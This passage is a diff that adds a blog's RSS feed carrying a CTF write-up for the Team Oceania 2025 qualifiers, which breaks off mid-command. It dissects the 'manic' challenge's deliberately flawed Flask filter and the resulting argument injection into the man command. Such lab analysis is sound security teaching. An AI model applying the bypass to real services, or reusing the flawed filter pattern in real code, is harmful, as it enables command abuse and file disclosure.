@@ -1,0 +1,1091 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Hashkitten_rulz on Solopie</title><link>https://www.solopie.com/tags/hashkitten_rulz/</link><description>Recent content in Hashkitten_rulz on Solopie</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Fri, 14 Feb 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://www.solopie.com/tags/hashkitten_rulz/index.xml" rel="self" type="application/rss+xml"/><item><title>Team Oceania CTF Qualifiers 2025 Writeups</title><link>https://www.solopie.com/p/team-oceania-ctf-qualifiers-2025-writeups/</link><pubDate>Fri, 14 Feb 2025 00:00:00 +0000</pubDate><guid>https://www.solopie.com/p/team-oceania-ctf-qualifiers-2025-writeups/</guid><description>&lt;img src="https://www.solopie.com/p/team-oceania-ctf-qualifiers-2025-writeups/oceania_logo_wide.png" alt="Featured image of post Team Oceania CTF Qualifiers 2025 Writeups" />&lt;h2 id="background">Background
+&lt;/h2>&lt;p>On the 8th of February, I participated in the Team Oceania CTF Qualifiers for 8 hours. In order to qualify for the team:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">The qualification criteria is…
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">We’ll automatically qualify the two fastest full clears in each category (Rev, Web, Crypto, Pwn, Forensics). If you full clear more than one only your fastest qualifying category counts (so the first one you get 1st or 2nd place in)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">We’ll also qualify the top 6 on the leaderboard who did not previously qualify.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Points will use dynamic scoring and only eligible players will affect the scoring (everyone else will be hidden).
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">The other criteria are…
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Must be born on or after 1st January 1999.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Must be over 18 years of age on the date of the international competition (roughly November)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Must be a citizen/permanent resident of Australia, New Zealand, or a Pacific Island country.
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Since I was born in 1999, I am elligible to qualify, so I attempted to try my best at the web category and get top 2. I was able to get first blood on the &lt;code>login&lt;/code> challenge but unfortunately the challenge took me a long time to solve, so I was unable to solve the remaining two web challenges. They were REALLY good web challenges and wanted to give a massive shout out to &lt;a class="link" href="https://x.com/hash_kitten" target="_blank" rel="noopener"
+>hashkitten&lt;/a> who authored these challenges. I think if the quality of the challenges were poor, I would have been salty about not making the team but since I knew they were really well-made, I have a lot of confidence in the selection process, and I am looking forward to Team Oceania bringing home the gold!&lt;/p>
+&lt;p>I have written writeups for the following web challenges:&lt;/p>
+&lt;ul>
+&lt;li>&lt;a class="link" href="#manic-180" >manic (180)&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="#beans-230" >beans (230)&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="#login-235" >login (235)&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h2 id="manic-180">manic (180)
+&lt;/h2>&lt;h3 id="description">Description
+&lt;/h3>&lt;p>Hackers keep getting into my manpage service!&lt;/p>
+&lt;p>&lt;a class="link" href="http://challenges.oceaniacc.com:5001" target="_blank" rel="noopener"
+>http://challenges.oceaniacc.com:5001&lt;/a>&lt;/p>
+&lt;h3 id="attachments">Attachments
+&lt;/h3>&lt;p>&lt;a class="link" href="https://github.com/AustICCQuals/Challenges2025/raw/refs/heads/main/web/manic/publish/src-manic.tar.gz" target="_blank" rel="noopener"
+>src-manic.tar.gz&lt;/a>&lt;/p>
+&lt;h3 id="writeup">Writeup
+&lt;/h3>&lt;h4 id="what-do-we-have-here">What do we have here?
+&lt;/h4>&lt;p>For this web challenge we are provided the source code via the attached compressed file &lt;code>src-manic.tar.gz&lt;/code>. We decompress with the following command:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tar xvf src-manic.tar.gz
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>The source code consists of a python web application which essentially allows us to read the manual pages for specified commands.&lt;/p>
+&lt;p>For example, browsing to the link &lt;code>http://challenges.oceaniacc.com:5001/1/grep&lt;/code> will give us section 1 of the &lt;code>grep&lt;/code> command manual page.&lt;/p>
+&lt;p>&lt;img src="https://www.solopie.com/p/team-oceania-ctf-qualifiers-2025-writeups/images/manic/grep_manpage.png"
+width="1048"
+height="694"
+srcset="https://www.solopie.com/p/team-oceania-ctf-qualifiers-2025-writeups/images/manic/grep_manpage_hu_d31248eea327b5d8.png 480w, https://www.solopie.com/p/team-oceania-ctf-qualifiers-2025-writeups/images/manic/grep_manpage_hu_60edc0a76e1232fb.png 1024w"
+loading="lazy"
+alt="grep command manpage"
+class="gallery-image"
+data-flex-grow="151"
+data-flex-basis="362px"
+>&lt;/p>
+&lt;p>How this works is it&amp;rsquo;s essentially running the &lt;code>man&lt;/code> command in the backend with the arguments inputted within the URL, and displaying the output on the webpage:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">man &lt;span class="m">1&lt;/span> grep
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>This logic can be observed at &lt;code>app.py#L11-L23&lt;/code>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="nd">@app.route&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/&amp;lt;path:command&amp;gt;&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">show_man_page&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">command&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">command_list&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">command&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">split&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># Only alphanumeric please&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">cmd&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">enumerate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">command_list&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">cmd&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">isalnum&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">del&lt;/span> &lt;span class="n">command_list&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">subprocess&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">run&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="s1">&amp;#39;man&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">command_list&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="n">capture_output&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">True&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">text&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">True&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">output&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">result&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">stderr&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="n">result&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">returncode&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="n">result&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">stdout&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">render_template&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;manpage.html&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">content&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">output&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Let&amp;rsquo;s break down the code so that we can understand the security controls in place and if there are any vulnerabilities that arise.&lt;/p>
+&lt;h4 id="source-code-breakdown">Source Code Breakdown
+&lt;/h4>&lt;p>First, let&amp;rsquo;s look at how the user inputs are initially passed.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="nd">@app.route&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/&amp;lt;path:command&amp;gt;&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">show_man_page&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">command&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">command_list&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">command&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">split&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>A route is set up at the root of the webpage &amp;ldquo;/&amp;rdquo; and defines a dynamic URL parameter named &lt;code>command&lt;/code> with the type &lt;code>path&lt;/code>. Any input in the URL path after the root &amp;ldquo;/&amp;rdquo; will be saved in this &lt;code>command&lt;/code> parameter.&lt;/p>
+&lt;p>This command parameter is passed to the &lt;code>show_man_page&lt;/code> function and the value is split into a list, with the delimiter being &amp;ldquo;/&amp;rdquo;.&lt;/p>
+&lt;p>For example, when the URL is &lt;code>/1/grep&lt;/code>, the value of command will be &lt;code>1/grep&lt;/code> and the value of &lt;code>command_list&lt;/code> will become &lt;code>[&amp;quot;1&amp;quot;,&amp;quot;grep&amp;quot;]&lt;/code>.&lt;/p>
+&lt;p>Following this, we observe a security control that attempts input sanitisation:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># Only alphanumeric please&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">cmd&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">enumerate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">command_list&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">cmd&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">isalnum&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">del&lt;/span> &lt;span class="n">command_list&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>This code iterates through the &lt;code>command_list&lt;/code> list with &lt;code>i&lt;/code> being the index of the iteration and &lt;code>cmd&lt;/code> being the value at the index.&lt;/p>
+&lt;p>For each iteration, using the &lt;a class="link" href="https://docs.python.org/3/library/stdtypes.html#str.isalnum" target="_blank" rel="noopener"
+>isalnum&lt;/a> function, if the value contains any characters that are not letters or digits, the list is modified to remove the current index.&lt;/p>
+&lt;p>While this could be seen as appropriate input filtering to not allow special characters, a bypass can occur due to modifying the list while it is being iterated through.&lt;/p>
+&lt;p>Say our &lt;code>command_list&lt;/code> variable contains the value &lt;code>[&amp;quot;1&amp;quot;,&amp;quot;i!!egal&amp;quot;,&amp;quot;also_illeg@l&amp;quot;, &amp;quot;valid&amp;quot;, &amp;quot;also_valid&amp;quot;]&lt;/code>. You would expect index 1 and 2 of the array to be deleted to result in &lt;code>[&amp;quot;1&amp;quot;, &amp;quot;valid&amp;quot;, &amp;quot;also_valid&amp;quot;]&lt;/code>. However, this is not the case.&lt;/p>
+&lt;p>Let&amp;rsquo;s see what happens in each iteration.&lt;/p>
+&lt;p>Iteration 0:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">command_list=[&amp;#34;1&amp;#34;,&amp;#34;i!!egal&amp;#34;,&amp;#34;also_illeg@l&amp;#34;, &amp;#34;valid&amp;#34;, &amp;#34;also_valid&amp;#34;]
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">i=0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cmd=&amp;#34;1&amp;#34;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">is cmd alphanumeric? YES
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nothing happens
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Iteration 1:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">command_list=[&amp;#34;1&amp;#34;,&amp;#34;i!!egal&amp;#34;,&amp;#34;also_illeg@l&amp;#34;, &amp;#34;valid&amp;#34;, &amp;#34;also_valid&amp;#34;]
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">i=1
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cmd=&amp;#34;i!!egal&amp;#34;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">is cmd alphanumeric? NO
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Delete command_list[1]:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">command_list=[&amp;#34;1&amp;#34;,&amp;#34;also_illeg@l&amp;#34;, &amp;#34;valid&amp;#34;, &amp;#34;also_valid&amp;#34;]
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Iteration 2:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">command_list=[&amp;#34;1&amp;#34;,&amp;#34;also_illeg@l&amp;#34;, &amp;#34;valid&amp;#34;, &amp;#34;also_valid&amp;#34;]
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">command_list=[&amp;#34;1&amp;#34;,&amp;#34;also_illeg@l&amp;#34;]
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">i=2
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cmd=&amp;#34;valid&amp;#34;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Wait what we skipped the &amp;#34;also_illeg@l&amp;#34; value?
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>After the rest of the iterations, as the following values are valid, nothing else gets deleted:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">command_list=[&amp;#34;1&amp;#34;,&amp;#34;also_illeg@l&amp;#34;, &amp;#34;valid&amp;#34;, &amp;#34;also_valid&amp;#34;]
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>This occurs because when we process index 1 and delete it, the value of index 1 becomes the value of index 2, and so on the next iteration at index 2, we have skipped the original value of index 2.&lt;/p>
+&lt;p>We have successfully found a bypass on the input sanitisation method, now allowing us to input arbitrary characters (besides &amp;ldquo;/&amp;rdquo; due to the split function removing all of those).&lt;/p>
+&lt;p>Moving on to the juicy part, command execution!&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl"> &lt;span class="n">result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">subprocess&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">run&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="s1">&amp;#39;man&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">command_list&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="n">capture_output&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">True&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">text&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">True&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">output&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">result&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">stderr&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="n">result&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">returncode&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="n">result&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">stdout&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>We can see that the &lt;code>man&lt;/code> command is executed with arguments provided by the user. If the inputs were only alphanumeric, then this code may not vulnerable, but as we found a way to bypass the input sanitisation, we can use hyphens to do argument injection.&lt;/p>
+&lt;h4 id="finding-the-right-argument-to-inject">Finding the Right Argument to Inject
+&lt;/h4>&lt;p>One thing I tried to do is to see if we can do things such as glob expansions or command substitution, however, due to how the run function works, command substitutions or other shell shenanigans won&amp;rsquo;t be executed.&lt;/p>
+&lt;p>Let&amp;rsquo;s step back to see what our objectives are. To obtain the flag, we can:&lt;/p>
+&lt;ol>
+&lt;li>Attempt to read the flag file at &lt;code>/flag.txt&lt;/code> with the &lt;code>man&lt;/code> binary&lt;/li>
+&lt;li>Execute other binaries to obtain the contents of &lt;code>/flag.txt&lt;/code>&lt;/li>
+&lt;/ol>
+&lt;p>The location of the flag can be observed at &lt;code>Dockerfile#L11&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-docker" data-lang="docker">&lt;span class="line">&lt;span class="cl">&lt;span class="k">COPY&lt;/span> flag.txt /&lt;span class="err">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>This part will require you to research each option until you are able to read the flag file. During my attempt of the challenge, I thought I could change the MANPATH and change the extensions of man pages that I read:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">-M, --manpath=PATH set search path for manual pages to PATH
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">...
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-e, --extension=EXTENSION limit search to extension type EXTENSION
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Testing &lt;code>man --manpath=/ --extension=txt&lt;/code> locally did not work unfortunately and resulted me in getting stuck on why that didn&amp;rsquo;t work. I never found out why due to the lack of documentation and was unable to solve the challenge during the CTF duration.&lt;/p>
+&lt;p>On review of the solution after the CTF finished, I felt very silly not checking this option out.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">-H, --html[=BROWSER] use www-browser or BROWSER to display HTML output
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>The fact that it says &lt;code>www-browser&lt;/code> is a big hint because I have seen it link to the lynx browser in Debian. I can see this on my Debian install:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">$ which www-browser
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/bin/www-browser
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$ ls -l /usr/bin/www-browser
